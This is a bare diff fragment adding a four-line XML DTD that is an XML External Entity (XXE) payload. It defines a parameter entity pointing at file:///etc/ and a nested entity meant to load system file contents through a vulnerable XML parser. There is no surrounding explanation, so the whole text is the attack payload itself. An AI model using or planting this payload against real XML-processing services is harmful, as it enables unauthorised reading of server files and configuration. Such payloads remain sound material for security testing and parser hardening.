@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///%file;'>">
+%eval;
+%exfil;
